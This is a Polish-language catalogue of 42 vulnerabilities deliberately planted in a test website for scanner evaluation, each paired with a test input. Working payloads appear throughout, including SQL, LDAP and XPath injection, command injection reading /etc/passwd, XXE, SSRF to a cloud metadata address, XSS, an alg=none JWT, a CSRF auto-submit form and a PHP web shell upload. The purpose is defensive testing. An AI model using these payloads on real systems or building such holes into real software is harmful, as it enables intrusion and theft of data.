# 📋 Dokumentacja Podatności Bezpieczeństwa

Kompleksowa lista wszystkich podatności bezpieczeństwa dodanych do strony testowej.

---

## 🔴 Injection Attacks

### 1. SQL Injection (MySQL)
**Plik:** `api/search.php`  
**Opis:** Brak prepared statements, bezpośrednie wstawianie danych użytkownika do zapytania SQL.  
**Test:**
```
api/search.php?q=test' OR '1'='1
api/search.php?q=test' UNION SELECT NULL, NULL--
```

### 2. PostgreSQL SQL Injection
**Plik:** `postgres-sqli.php`, `postgres-advanced.php`  
**Opis:** Podatność na SQL Injection w PostgreSQL z wykorzystaniem funkcji specyficznych dla PostgreSQL.  
**Test:**
```
postgres-sqli.php?id=1' OR '1'='1
postgres-sqli.php?id=1' UNION SELECT NULL, version(), NULL--
postgres-advanced.php?search=test' UNION SELECT NULL, table_name, NULL FROM information_schema.tables--
```

### 3. NoSQL Injection
**Plik:** `nosql.php`  
**Opis:** Brak walidacji w zapytaniach NoSQL, możliwość manipulacji zapytaniami.  
**Test:**
```
nosql.php?user[$ne]=1
nosql.php?user[$gt]=0
```

### 4. LDAP Injection
**Plik:** `ldap-injection.php`  
**Opis:** Brak walidacji w zapytaniach LDAP, możliwość manipulacji filtrami LDAP.  
**Test:**
```
ldap-injection.php?username=*)(&
ldap-injection.php?username=*)(|(cn=admin)
```

### 5. XPATH Injection
**Plik:** `xpath-injection.php`  
**Opis:** Brak walidacji w zapytaniach XPath, możliwość manipulacji zapytaniami XML.  
**Test:**
```
xpath-injection.php?name=' or '1'='1
xpath-injection.php?name=' or '1'='1' or '1'='1
```

### 6. Command Injection
**Plik:** `command-injection.php`  
**Opis:** Wykonywanie poleceń systemowych bez walidacji inputu użytkownika.  
**Test:**
```
command-injection.php?cmd=whoami
command-injection.php?cmd=id
command-injection.php?cmd=ls -la
command-injection.php?cmd=cat /etc/passwd
```

### 7. XXE (XML External Entity)
**Plik:** `xxe.php`  
**Opis:** Brak walidacji XML, możliwość odczytu plików systemowych przez External Entity.  
**Test:**
```xml
POST xxe.php
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

### 8. Server-Side Request Forgery (SSRF)
**Plik:** `ssrf.php`  
**Opis:** Brak walidacji URL, możliwość wykonywania żądań do wewnętrznych zasobów.  
**Test:**
```
ssrf.php?url=http://localhost:80
ssrf.php?url=http://169.254.169.254/latest/meta-data/
ssrf.php?url=file:///etc/passwd
```

---

## 🟠 Authentication & Authorization

### 9. IDOR (Insecure Direct Object Reference)
**Plik:** `api.php`  
**Opis:** Brak autoryzacji, możliwość dostępu do danych innych użytkowników poprzez manipulację ID.  
**Test:**
```
api.php?id=1
api.php?id=2
api.php?id=999
```

### 10. Brute Force (Brak Rate Limiting)
**Plik:** `api/login.php`, `login.php`  
**Opis:** Brak ograniczeń liczby prób logowania, możliwość ataku brute force.  
**Test:**
```
api/login.php?user=admin&pass=admin
login.php (POST) - wielokrotne próby
```

### 11. JWT Weaknesses
**Plik:** `jwt-test.php`  
**Opis:** Słabe klucze JWT, akceptacja alg=none, brak weryfikacji podpisu.  
**Test:**
```
jwt-test.php
jwt-test.php?token=eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
```

### 12. User Enumeration
**Plik:** `user-enumeration.php`  
**Opis:** Różne komunikaty błędów dla istniejących i nieistniejących użytkowników.  
**Test:**
```
user-enumeration.php?email=admin@example.com&password=wrong
user-enumeration.php?email=nonexistent@example.com&password=wrong
```

### 13. Insecure Password Reset
**Plik:** `password-reset.php`  
**Opis:** Przewidywalne tokeny resetowania, tokeny w URL, brak wygaśnięcia.  
**Test:**
```
password-reset.php?email=admin@example.com
password-reset.php?token=MD5_HASH&email=admin@example.com
```

### 14. Session Fixation
**Plik:** `session-fixation.php`  
**Opis:** Brak regeneracji ID sesji po logowaniu, możliwość przejęcia sesji.  
**Test:**
```
session-fixation.php?user=admin
```

### 15. Mass Assignment
**Plik:** `mass-assignment.php`  
**Opis:** Brak filtrowania pól, możliwość przypisania nieoczekiwanych wartości (np. role=admin).  
**Test:**
```
POST mass-assignment.php
role=admin&is_admin=true&email=test@example.com
```

### 16. Exposed Admin Panel
**Plik:** `admin.php`  
**Opis:** Publiczny panel administracyjny z domyślnymi hasłami.  
**Test:**
```
admin.php
Credentials: admin/admin
```

---

## 🟡 Client-Side Vulnerabilities

### 17. XSS (Cross-Site Scripting)
**Plik:** `xss.php`, `xss-test.php`  
**Opis:** Brak escapowania outputu, możliwość wstrzyknięcia kodu JavaScript.  
**Test:**
```
xss.php?q=<script>alert('XSS')</script>
xss.php?q=<img src=x onerror=alert('XSS')>
xss-test.php?name=<svg onload=alert('XSS')>
```

### 18. Open Redirect
**Plik:** `redirect.php`  
**Opis:** Brak walidacji URL przekierowania, możliwość przekierowania na złośliwe strony.  
**Test:**
```
redirect.php?url=https://evil.com
redirect.php?url=javascript:alert('XSS')
```

### 19. CSRF (Cross-Site Request Forgery)
**Plik:** `csrf-test.php`  
**Opis:** Brak tokenów CSRF, możliwość wykonania akcji w imieniu użytkownika.  
**Test:**
```html
<!-- Na złośliwej stronie -->
<form action="http://target/csrf-test.php" method="POST">
    <input name="action" value="transfer">
    <input name="amount" value="1000">
</form>
<script>document.forms[0].submit();</script>
```

### 20. CORS Misconfiguration
**Plik:** `cors-test.php`  
**Opis:** Access-Control-Allow-Origin: * z credentials: true, możliwość cross-origin ataków.  
**Test:**
```javascript
fetch("http://target/cors-test.php", {
    method: "POST",
    credentials: "include"
});
```

### 21. Clickjacking
**Plik:** `.htaccess` (brak X-Frame-Options)  
**Opis:** Brak nagłówka X-Frame-Options, możliwość osadzenia strony w iframe.  
**Test:**
```html
<iframe src="http://target/index.html"></iframe>
```

### 22. LocalStorage Exposure
**Plik:** `index.html`  
**Opis:** Tokeny sesji przechowywane w localStorage, widoczne w DevTools.  
**Test:**
```javascript
console.log(localStorage.getItem("session_token"));
console.log(localStorage.getItem("refresh_token"));
```

### 23. Insecure Cookies
**Plik:** `index.html`  
**Opis:** Cookies bez flag HTTPOnly i Secure, możliwość dostępu przez JavaScript.  
**Test:**
```javascript
document.cookie = "jwt=FAKE_JWT_12345; path=/";
console.log(document.cookie);
```

---

## 🔵 Information Disclosure

### 24. Verbose Error Messages
**Plik:** `error-test.php`  
**Opis:** Szczegółowe komunikaty błędów ze stack trace, ścieżkami plików i wersjami.  
**Test:**
```
error-test.php
```

### 25. Debug Mode Enabled
**Plik:** `debug.php`, `config.php`  
**Opis:** Włączony tryb debugowania, wyświetlanie phpinfo() i zmiennych środowiskowych.  
**Test:**
```
debug.php
config.php
```

### 26. Information Disclosure w Headers
**Plik:** `headers.php`  
**Opis:** Nagłówki HTTP ujawniające wersje oprogramowania (X-Powered-By, Server).  
**Test:**
```
headers.php
# Sprawdź nagłówki odpowiedzi
```

### 27. Publiczny plik .env
**Plik:** `.env`  
**Opis:** Plik środowiskowy z kluczami API, hasłami i tokenami dostępny publicznie.  
**Test:**
```
.env
```

### 28. Publiczne repozytorium .git
**Plik:** `.git/config`, `.git/HEAD`, `.git/logs/HEAD`  
**Opis:** Dostęp do historii commitów, konfiguracji i wrażliwych danych w repozytorium.  
**Test:**
```
.git/config
.git/HEAD
.git/logs/HEAD
```

### 29. Publiczne Source Maps
**Plik:** `index.js.map`, `api.js.map`  
**Opis:** Source mapy zawierające wrażliwe dane (klucze API, hasła) w kodzie źródłowym.  
**Test:**
```
index.js.map
api.js.map
```

### 30. Directory Listing
**Plik:** `test/` (katalog)  
**Opis:** Włączony directory listing, możliwość przeglądania struktury katalogów.  
**Test:**
```
test/
test/backup.zip
test/config.json
test/data.csv
```

### 31. Wrażliwe pliki backup
**Plik:** `backup.zip`, `config.old.json`, `wp-config.php.bak`, `database.db`  
**Opis:** Pliki backup zawierające wrażliwe dane dostępne publicznie.  
**Test:**
```
backup.zip
config.old.json
wp-config.php.bak
database.db
```

### 32. phpinfo() Disclosure
**Plik:** `uploads/phpinfo.php`  
**Opis:** Plik phpinfo() ujawniający szczegółowe informacje o konfiguracji serwera.  
**Test:**
```
uploads/phpinfo.php
```

### 33. robots.txt ujawniający ścieżki
**Plik:** `robots.txt`  
**Opis:** Plik robots.txt celowo ujawniający wrażliwe ścieżki i katalogi.  
**Test:**
```
robots.txt
```

### 34. Wyciek danych w HTML (Next.js)
**Plik:** `index.html` (__TEST_DATA__)  
**Opis:** Dane wrażliwe wbudowane w HTML (symulacja błędu Next.js).  
**Test:**
```html
<script id="__TEST_DATA__">
{
    "user": {"email": "admin@example.com", "token": "..."},
    "config": {"database_password": "..."}
}
</script>
```

### 35. Wyeksponowane klucze API w JavaScript
**Plik:** `index.html`, `index.js`, `firebase-config.js`  
**Opis:** Klucze API widoczne w kodzie źródłowym JavaScript.  
**Test:**
```javascript
// W index.html i index.js
const STRIPE = "sk_live_...";
const AWS_ACCESS_KEY = "...";
const SUPABASE_SERVICE_ROLE_KEY = "...";
```

---

## 🟢 Server Configuration

### 36. Brak nagłówków bezpieczeństwa
**Plik:** `.htaccess`  
**Opis:** Brak CSP, HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy.  
**Test:**
```
# Sprawdź nagłówki odpowiedzi - brak security headers
```

### 37. Host Header Injection
**Plik:** `host-header.php`  
**Opis:** Brak walidacji nagłówka Host, możliwość cache poisoning i password reset poisoning.  
**Test:**
```
host-header.php
# Z nagłówkiem: Host: evil.com
```

### 38. HTTP Parameter Pollution
**Plik:** `parameter-pollution.php`  
**Opis:** Brak walidacji wielokrotnych parametrów, możliwość manipulacji logiką aplikacji.  
**Test:**
```
parameter-pollution.php?user=admin&user=attacker&role=admin&role=user
```

### 39. Unsafe File Upload
**Plik:** `upload.php`  
**Opis:** Brak walidacji plików, możliwość uploadu plików PHP i wykonania kodu (RCE).  
**Test:**
```
POST upload.php
# Upload pliku: shell.php z kodem <?php system($_GET['cmd']); ?>
```

---

## 🟣 Business Logic Flaws

### 40. Business Logic Flaws
**Plik:** `business-logic.php`  
**Opis:** Brak walidacji logiki biznesowej, możliwość ustawienia ujemnych cen/ilości.  
**Test:**
```
POST business-logic.php
price=-1000
quantity=-10
```

### 41. Insecure Deserialization
**Plik:** `deserialization.php`  
**Opis:** Deserializacja niezaufanych danych bez walidacji, możliwość RCE.  
**Test:**
```
deserialization.php?data=BASE64_SERIALIZED_DATA
```

---

## 🔷 GraphQL & API

### 42. GraphQL Injection
**Plik:** `graphql.php`  
**Opis:** Brak walidacji zapytań GraphQL, możliwość dostępu do nieautoryzowanych danych.  
**Test:**
```
graphql.php?query={users{id,email,password}}
graphql.php?query={__schema{types{name}}}
```

---

## 📊 Podsumowanie

**Łącznie: 42 różne typy podatności**

### Kategorie:
- **Injection Attacks:** 8 podatności
- **Authentication & Authorization:** 8 podatności
- **Client-Side Vulnerabilities:** 7 podatności
- **Information Disclosure:** 12 podatności
- **Server Configuration:** 4 podatności
- **Business Logic Flaws:** 2 podatności
- **GraphQL & API:** 1 podatność

### Poziomy ryzyka:
- 🔴 **Krytyczne:** SQL Injection, Command Injection, RCE, SSRF
- 🟠 **Wysokie:** IDOR, Brute Force, JWT Weaknesses, Mass Assignment
- 🟡 **Średnie:** XSS, CSRF, CORS, Open Redirect
- 🟢 **Niskie:** Information Disclosure, Directory Listing

---

## ⚠️ OSTRZEŻENIE

**Ta strona została celowo stworzona z podatnościami bezpieczeństwa do testów.**

**NIGDY nie używaj tej strony na produkcji!**

Użyj lokalnie lub na subdomenie testowej, którą później usuniesz.

---

## 📝 Notatki

- Wszystkie klucze API i hasła są fałszywe (z prefiksem `FAKE_TEST_`)
- Podatności są celowo uproszczone dla łatwego wykrycia przez skanery
- Niektóre podatności wymagają odpowiedniej konfiguracji serwera (np. PHP z określonymi modułami)
- Dokumentacja może być aktualizowana wraz z dodawaniem nowych podatności

